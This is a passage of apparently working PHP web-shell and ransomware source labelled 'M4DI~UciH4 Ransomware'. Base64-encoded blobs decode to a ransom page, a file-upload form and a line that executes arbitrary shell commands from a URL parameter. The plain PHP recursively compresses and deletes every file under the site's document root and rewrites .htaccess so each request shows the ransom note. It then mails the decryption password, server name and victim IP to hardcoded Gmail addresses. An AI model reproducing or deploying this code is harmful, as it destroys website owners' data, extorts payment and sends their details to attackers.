DQplY2hvICI8YnI+V2Vicm9vdCBEZWNyeXB0ZWQ8YnI+IjsNCnVubGluaygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7DQp1bmxpbmsoJy5odGFjY2VzcycpOw0KY29weSgnaHRhYmFja3VwJywnLmh0YWNjZXNzJyk7DQplY2hvICdTdWNjZXNzICEhISc7DQp9IGVsc2Ugew0KZWNobyAnRmFpbGVkIFBhc3N3b3JkICEhISc7DQp9DQpleGl0KCk7DQp9DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KICAgIGJhY2tncm91bmQ6ICMxQTFDMUY7DQogICAgY29sb3I6ICNlMmUyZTI7DQp9DQphew0KICAgY29sb3I6Z3JlZW47DQp9DQphLnR5cGUxOmxpbmsgeyBjb2xvcjpibGFjazt0ZXh0LWRlY29yYXRpb246IG5vbmU7fQ0KYS50eXBlMTp2aXNpdGVkIHsgY29sb3I6Z3JleTsgfQ0KYS50eXBlMTpob3ZlciB7IA0KIC13ZWJraXQtYmFja2dyb3VuZC1jbGlwOiB0ZXh0Ow0KIGNvbG9yOiB3aGl0ZTsNCiAtd2Via2l0LXRleHQtZmlsbC1jb2xvcjogdHJhbnNwYXJlbnQ7DQogICBiYWNrZ3JvdW5kLWltYWdlOiAtd2Via2l0LWdyYWRpZW50KGxpbmVhciwgbGVmdCB0b3AsIHJpZ2h0IHRvcCwgZnJvbSgjZWE4NzExKSwgdG8oI2Q5NjM2MykpOw0KIGJhY2tncm91bmQtaW1hZ2U6IC13ZWJraXQtbGluZWFyLWdyYWRpZW50KGxlZnQsICNlYTg3MTEsICNkOTYzNjMsICM3M2E2ZGYsICM5MDg1ZmIsICM1MmNhNzkpOyANCiBiYWNrZ3JvdW5kLWltYWdlOiAgICAtbW96LWxpbmVhci1ncmFkaWVudChsZWZ0LCAjZWE4NzExLCAjZDk2MzYzLCAjNzNhNmRmLCAjOTA4NWZiLCAjNTJjYTc5KTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAgICAgLW1zLWxpbmVhci1ncmFkaWVudChsZWZ0LCAjZWE4NzExLCAjZDk2MzYzLCAjNzNhNmRmLCAjOTA4NWZiLCAjNTJjYTc5KTsgDQogYmFja2dyb3VuZC1pbWFnZTogICAgICAtby1saW5lYXItZ3JhZGllbnQobGVmdCwgI2VhODcxMSwgI2Q5NjM2MywgIzczYTZkZiwgIzkwODVmYiwgIzUyY2E3OSk7DQogfQ0KIC5pbWcgew0KCWZvbnQtc2l6ZTogN3B4Ow0KCX0NCmgxew0KICAgIGZvbnQtZmFtaWx5OiBPcmJpdHJvbjsNCiAgICBmb250LXNpemU6IDIwcHg7DQogICAgY29sb3I6ICMxYWJjOWM7DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQoJPD9waHANCiRlbWwgPSAnaW5kb21pbGs4N0BnbWFpbC5jb20sc3lhaHJpbmlzYXlhbmdAZ21haWwuY29tLG1hdWxpZGF6aGE1ODdAZ21haWwuY29tJzsNCiRqZGwgPSAnSW5mb3JtYXNpIFVwbG9hZGVyIFJhbnNvbXdhcmUnOw0KJG1zZyA9ICJVcGxvYWQgRmlsZXMgIDogIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iLyIuJF9GSUxFU1snanVzdF9maWxlJ11bJ25hbWUnXS4ibiIuIllvdXIgQWNjcHQgICAgOiAiLiRfU0VSVkVSWydIVFRQX0FDQ0VQVCddLiJuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1uIi4iSVAgQWRkcmVzcyAgICAgOiAiLiRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJuIi4iVXNlciBBZ2VudCAgICAgOiAiLiRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCg0KCSBpZihpc3NldCgkX0dFVFsidXAiXSkpDQogew0KZWNobyAiPGNlbnRlcj48YnI+IjsNCmVjaG8gIjxiPjxicj4iOw0KZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCgkgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdqdXN0X2ZpbGUnPg0KCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0nR2FzcG9sISc+DQoJICA8L2Zvcm0+DQoJICA8L2NlbnRlcj4iOw0KJHJvb3QgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOw0KJGZpbGVzID0gJF9GSUxFU1snanVzdF9maWxlJ11bJ25hbWUnXTsNCiRkZXN0ID0gJHJvb3QuJy8nLiRmaWxlczsNCmlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7DQoJaWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7DQoJCWlmKEBjb3B5KCRfRklMRVNbJ2p1c3RfZmlsZSddWyd0bXBfbmFtZSddLCAkZGVzdCkpDQppZihtYWlsKCRlbWwsJGpkbCwkbXNnKSkgew0KCQkJJHdlYiA9ICJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIi8iOw0KCQkJZWNobyAiPGJyPjxmb250IGNvbG9yPWdyZWVuPlVwbG9hZCBTdWtzZXM8L2ZvbnQ+IC0tPiA8Zm9udCBjb2xvcj1yZWQ+PGEgaHJlZj0nJHdlYiRmaWxlcycgdGFyZ2V0PSdfYmxhbmsnPjxiPjx1PiR3ZWIvJGZpbGVzPC91PjwvYj48L2E+PC9mb250PiI7DQoJCX0gZWxzZSB7DQoJCQllY2hvICI8Zm9udCBjb2xvcj1yZWQ+R2FnYWwgVXBsb2FkIERpIERvY3VtZW50IFJvb3Q8L2ZvbnQ+IjsNCgkJfQ0KCX0gZWxzZSB7DQoJCWlmKEBjb3B5KCRfRklMRVNbJ2p1c3RfZmlsZSddWyd0bXBfbmFtZSddLCAkZmlsZXMpKSB7DQoJCQllY2hvICIgVXBsb2FkIDxiPiRmaWxlczwvYj4gRGkgRm9sZGVyIEluaSI7DQoJCX0gZWxzZSB7DQoJCQllY2hvICI8Zm9udCBjb2xvcj1yZWQ+VXBsb2FkIEZhaWxlZDwvZm9udD4iOw0KCQl9DQoJfQ0KfQ0KfQ0KPz4NCjxjZW50ZXI+DQo8cHJlPg0KPD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4NCjxmb250IGNsYXNzPSJpbWciIGNvbG9yPSJyZWQiPg0KICAgICAgICAgICAgICAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2ICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICDCtsK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgwrbCtsK2wrYgICAgICAgICAgICAgIA0KICAgICAgICAgICAgIMK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgIA0KICAgICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgDQogICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtiAgICAgICAgICANCiAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgICDCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgwrbCtiDCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgIMK2wrbCtsK2IMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgICDCtsK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrbCtiAgICAgICAgICAgICANCiAgICDCtsK2wrYgICAgICAgwrbCtiAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgIMK2wrYgICAgICDCtsK2wrbCtiAgIA0KICAgwrbCtsK2wrbCtiAgICAgwrbCtiAgIMK2wrbCtsK2wrbCtsK2ICAgwrbCtsK2ICAgwrbCtsK2wrbCtsK2wrYgICDCtsK2ICAgICDCtsK2wrbCtsK2wrYgIA0KICDCtsK2ICAgwrbCtiAgICDCtsK2ICAgICDCtsK2wrYgICAgwrbCtsK2wrbCtiAgICDCtsK2wrYgICAgIMK2wrYgICAgwrbCtiAgIMK2wrYgIA0KIMK2wrbCtiAgICDCtsK2wrbCtiAgwrbCtiAgICAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICDCtsK2wrbCtiAgICDCtsK2wrYgDQrCtsK2ICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgICAgICAgIMK2wrYNCsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtg0KICDCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgwrbCtsK2IMK2wrYgICAgIMK2wrbCtsK2wrbCtiDCtsK2wrYgDQogICAgICAgICAgwrbCtsK2wrbCtsK2ICDCtsK2wrYgIMK2wrYgICAgICAgICAgIMK2wrYgIMK2wrbCtiAgwrbCtsK2wrbCtsK2ICAgICAgICANCiAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2IMK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2IMK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrbCtiAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgwrbCtsK2wrYgIMK2IMK2IMK2IMK2IMK2IMK2IMK2IMK2ICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICDCtsK2wrbCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgIMK2wrYgwrbCtsK2wrbCtiAgICAgICAgICAgIA0KICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2ICAgICAgICAgICAgICAgICDCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgIA0KICAgwrbCtiAgICAgICAgICAgwrbCtsK2wrbCtsK2wrYgICAgICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICAgDQogICAgwrbCtsK2ICAgICDCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrYgICAgIMK2wrbCtiAgICANCiAgICAgIMK2wrYgICDCtsK2wrYgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgwrbCtsK2ICAgwrbCtiAgICAgIA0KICAgICAgwrbCtiAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgwrbCtiAgICAgIA0KICAgICAgIMK2wrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2ICAgICAgIA0KPC9mb250Pg0KPGgxPiAgDQpZb3VyIHNpdGUgaXMgbG9ja2VkIGJ5IHRoZSBjdXN0b20gcmFuc29td2FyZSBlbmNyeXB0aW9uIG1ldGhvZA0KUGxlYXNlIHBheSA8Zm9udCBjb2xvcj0iZ29sZCI+JDM8L2ZvbnQ+IHRvIDxhIGNsYXNzPSJ0eXBlMSIgaHJlZj0icGF5cGFsIj48Zm9udCBjb2xvcj0icmVkIj5wYXlwYWw8L2ZvbnQ+PC9hPiB0byByZXN0b3JlIHlvdXIgd2Vic2l0ZSB0aGF0IGlzIGxvY2tlZA0KT3Igd2l0aGluIDI0IGhvdXJzIGFsbCB5b3VyIGZpbGVzIG9uIHRoaXMgd2Vic2l0ZSB3aWxsIGJlIGRlbGV0ZWQgPC9oPg0KPGZvbnQgY29sb3I9IndoaXRlIj4tWyA8L2ZvbnQ+PGEgY2xhc3M9InR5cGUxIiBocmVmPSJtYWlsdG86aW5kb21pbGs4N0BnbWFpbC5jb20iPjxmb250IGNvbG9yPSJncmVlbiI+aW5kb21pbGs4N0BnbWFpbC5jb208L2ZvbnQ+PC9hPiA8Zm9udCBjb2xvcj0id2hpdGUiPl0tPC9mb250Pg0KPGZvbnQgY29sb3I9ImdvbGQiPjw8L2ZvbnQ+PGZvbnQgY29sb3I9InJlZCI+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS08L2ZvbnQ+PGZvbnQgY29sb3I9ImdvbGQiPj48L2ZvbnQ+DQpUaGlzIGlzIGEgbm90aWNlIG9mIDxhIGNsYXNzPSJ0eXBlMSIgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSI+PGZvbnQgY29sb3I9ImdyZWVuIj5yYW5zb213YXJlPC9mb250PjwvYT48YnI+DQpIb3cgdG8gcmVzdG9yZSB0aGUgYmVnaW5uaW5nPw0KUGxlYXNlIGNvbnRhY3QgdXMgdmlhIGVtYWlsIGxpc3RlZA0KPC9oMT4NCjwvcHJlPg0KPC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQo8YnI+PGJyPg0KCTxjZW50ZXI+PGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVjcnlwdCI+DQo8L2Zvcm0+PGlmcmFtZSB3aWR0aD0iMCIgaGVpZ2h0PSIwIiBzcmM9IiMiIGZyYW1lYm9yZGVyPSIwIiBhbGxvd2Z1bGxzY3JlZW4+PC9pZnJhbWU+PC9jZW50ZXI+DQo8YnI+");$q=str_replace('jancokjaran',md5($_POST['pass']),$file);$w=str_replace('indomilk87@gmail.com',$_POST['email'],$q);$e=str_replace('paypal',$_POST['paypal'],$w);$r=str_replace('$3','$'.$_POST['price'],$e);$dec=$r;$comp="<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";$cok=fopen('m4d1.php','w');fwrite($cok,$comp);fclose($cok);$hta="DirectoryIndex m4d1.php\n
ErrorDocument 403 /m4d1.php\n
ErrorDocument 404 /m4d1.php\n
ErrorDocument 500 /m4d1.php\n";
$ht=fopen('.htaccess','w');fwrite($ht,$hta);fclose($ht);echo "$filename Encrypted !!!<br>";}function encdir($dir){$files=array_diff(scandir($dir),array('.','..'));foreach($files as $file){if(is_dir($dir."/".$file)){encdir($dir."/".$file);}else{encfile($dir."/".$file);}}}if(isset($_POST['pass'])){encdir($_SERVER['DOCUMENT_ROOT']);}copy('m4d1.php',$_SERVER['DOCUMENT_ROOT'].'/m4d1.php');copy('.htaccess',$_SERVER['DOCUMENT_ROOT'].'.htaccess');copy($_SERVER['DOCUMENT_ROOT'].'.htaccess',$_SERVER['DOCUMENT_ROOT'].'.htabackup');$to=$_POST['email'];$subject='M4DI~UciH4 Ransomware Informasi';$message="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];$too='indomilk87@gmail.com,syahrinisayang@gmail.com,maulidazha587@gmail.com';$title='M4DI~UciH4 Ransomware Informasi';$pesan="Your Domain   : ".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."\n"."Your Password : ".$_POST['pass']."\n===================================\n"."IP Address     : ".$_SERVER['REMOTE_ADDR']."\n"."User Agent     : ".$_SERVER['HTTP_USER_AGENT'];if(mail($to,$subject,$message))if(mail($too,$title,$pesan)){echo 'Password Saved In Your Mail !!!';}else{echo 'Password Not In Your Mail !!!';}exit();
}
?>
	<pre>
<h2><center><font color=red>M4DI~UciH4 Ransomware</h2></font></pre></center>
<form enctype="multipart/form-data" method="post" style=" text-align: center;">
	    <input type="text" name="email" placeholder="Your Email">
		<input type="text" name="paypal" placeholder="Your Paypal">
        <input type="text" name="price" placeholder="Your Price">
        <input type="password" name="pass" placeholder="Password">
        <input type="submit" value="Encrypt">
        </form>
<?php
		} elseif (isset($_GET[hex('ransomware')])) {
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.m4d1') !== false) {
    return;
	}
	file_put_contents($filename.".m4d1", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
$file = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAia29udG9sIjsNCmlmKGlzc2V0KCRpbnB1dCkpIHsNCmlmKG1kNSgkaW5wdXQpID09ICRwYXNzKSB7DQpmdW5jdGlvbiBkZWNmaWxlKCRmaWxlbmFtZSl7DQoJaWYgKHN0cnBvcygkZmlsZW5hbWUsICcubTRkMScpID09PSBGQUxTRSkgew0KCXJldHVybjsNCgl9DQoJJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsNCglmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLm00ZDEnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQp1bmxpbmsoJ2Rqb2F0LnBocCcpOw0KCXVubGluaygkZmlsZW5hbWUpOw0KCWVjaG8gJzx0aXRsZT5NNEQxIFJhbnNvbVdhcmU8L3RpdGxlPjxib2R5IGJnY29sb3I9IzFBMUMxRj48aSBjbGFzcz0iZmEgZmEtdW5sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8Zm9udCBjb2xvcj0iI0ZGRUIzQiI+VW5sb2NrPC9mb250PiAoPGZvbnQgY29sb3I9IiM0MENFMDgiPlN1Y2Nlc3M8L2ZvbnQ+KSA8Zm9udCBjb2xvcj0iIzAwRkZGRiI+PT48L2ZvbnQ+IDxmb250IGNvbG9yPSIjMjE5NkYzIj4nLiRmaWxlbmFtZS4nPC9mb250PiA8YnI+JzsNCn0NCg0KZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0KCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQoJCWZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCgkJCQlkZWNkaXIoJGRpci4iLyIuJGZpbGUpOw0KCQkJfWVsc2Ugew0KCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0KCQl9DQoJfQ0KfQ0KDQpkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+PGJyPkRlY3J5cHRlZDxicj4nOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5zdWNlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICc8dGl0bGU+TTREMSBSYW5zb21XYXJlPC90aXRsZT4NCjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjY2MxMDE3Ij4NCjxib2R5IGJnY29sb3I9IzFBMUMxRj4NCjxwcmU+DQo8Y2VudGVyPjxoMT4NCjxmb250IGNsYXNzPSJpbWciIGNvbG9yPSJyZWQiPg0KICAgICAgICAgICAgICAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2ICAgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2ICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICDCtsK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgwrbCtsK2wrYgICAgICAgICAgICAgIA0KICAgICAgICAgICAgIMK2wrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgIA0KICAgICAgICAgICAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgICAgICAgICAgDQogICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgDQogICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtiAgICAgICAgICANCiAgICAgICAgICDCtsK2IMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrYgIMK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiDCtsK2ICAgICAgICAgIA0KICAgICAgICAgIMK2wrYgIMK2wrYgICAgICAgICAgICAgICAgICAgICAgICAgICDCtsK2ICDCtsK2ICAgICAgICAgIA0KICAgICAgICAgICDCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2ICAgwrbCtiDCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgIMK2wrbCtsK2IMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgICAgICANCiAgICAgICAgICAgICDCtsK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2IMK2wrbCtiAgICAgICAgICAgICANCiAgICDCtsK2wrYgICAgICAgwrbCtiAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgIMK2wrYgICAgICDCtsK2wrbCtiAgIA0KICAgwrbCtsK2wrbCtiAgICAgwrbCtiAgIMK2wrbCtsK2wrbCtsK2ICAgwrbCtsK2ICAgwrbCtsK2wrbCtsK2wrYgICDCtsK2ICAgICDCtsK2wrbCtsK2wrYgIA0KICDCtsK2ICAgwrbCtiAgICDCtsK2ICAgICDCtsK2wrYgICAgwrbCtsK2wrbCtiAgICDCtsK2wrYgICAgIMK2wrYgICAgwrbCtiAgIMK2wrYgIA0KIMK2wrbCtiAgICDCtsK2wrbCtiAgwrbCtiAgICAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICDCtsK2wrbCtiAgICDCtsK2wrYgDQrCtsK2ICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtiAgICAgICDCtsK2wrbCtsK2wrbCtsK2wrYgICAgICAgIMK2wrYNCsK2wrbCtsK2wrbCtsK2wrbCtiAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtiAgICDCtsK2wrbCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtg0KICDCtsK2wrbCtiDCtsK2wrbCtsK2ICAgICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgwrbCtsK2IMK2wrYgICAgIMK2wrbCtsK2wrbCtiDCtsK2wrYgDQogICAgICAgICAgwrbCtsK2wrbCtsK2ICDCtsK2wrYgIMK2wrYgICAgICAgICAgIMK2wrYgIMK2wrbCtiAgwrbCtsK2wrbCtsK2ICAgICAgICANCiAgICAgICAgICAgICAgwrbCtsK2wrbCtsK2IMK2wrYgwrbCtsK2wrbCtsK2wrbCtsK2wrbCtiDCtsK2IMK2wrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICDCtsK2IMK2wrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrYgwrbCtiAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgwrbCtsK2wrYgIMK2IMK2IMK2IMK2IMK2IMK2IMK2IMK2ICAgwrbCtsK2wrbCtiAgICAgICAgICAgICAgDQogICAgICAgICAgICDCtsK2wrbCtsK2IMK2wrYgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtiAgIMK2wrYgwrbCtsK2wrbCtiAgICAgICAgICAgIA0KICAgIMK2wrbCtsK2wrbCtsK2wrbCtsK2ICAgICDCtsK2ICAgICAgICAgICAgICAgICDCtsK2ICAgICAgwrbCtsK2wrbCtsK2wrbCtsK2ICAgIA0KICAgwrbCtiAgICAgICAgICAgwrbCtsK2wrbCtsK2wrYgICAgICAgICAgICAgwrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICDCtsK2ICAgDQogICAgwrbCtsK2ICAgICDCtsK2wrbCtsK2ICAgICDCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYgICAgIMK2wrbCtsK2wrYgICAgIMK2wrbCtiAgICANCiAgICAgIMK2wrYgICDCtsK2wrYgICAgICAgICAgIMK2wrbCtsK2wrbCtsK2wrbCtiAgICAgICAgICAgwrbCtsK2ICAgwrbCtiAgICAgIA0KICAgICAgwrbCtiAgwrbCtiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwrbCtiAgwrbCtiAgICAgIA0KICAgICAgIMK2wrbCtsK2ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIMK2wrbCtsK2ICAgICAgIA0KPC9mb250Pjxicj4NCjxpPg0KICAgICAgICAgICAgPGZvbnQgY29sb3I9InJlZCIgc2l6ZT0iMjAiPldyb25nIFBhc3N3b3JkICEhITwvZm9udD48L2k+DQo8L3ByZT4nOw0KfQ0KZXhpdCgpOw0KfQ0KPz4NCgk8IS0tLS0tLS0tLS0tLSBNNEQxIFJhbnNvbVdhcmUgLS0tLS0tLS0+IA0KPGh0bWw+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD13aW5kb3dzLTEyNTIiPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg0KPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik00RDF+VWNpSDQiPg0KPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IiBSYW5zb213YXJlLCBSYW5zb213ZWIsIEhhY2tlZCwgTG9ja2VkLCBFbmNyeXB0ZWQiPiANCjxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iTTRESX5VY2lINCI+DQo8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImluZGV4LCBhbGwiPg0KCTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1NZXJpZW5kYScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DQo8bGluayBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9VWJ1bnR1JyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxsaW5rIGhyZWY9J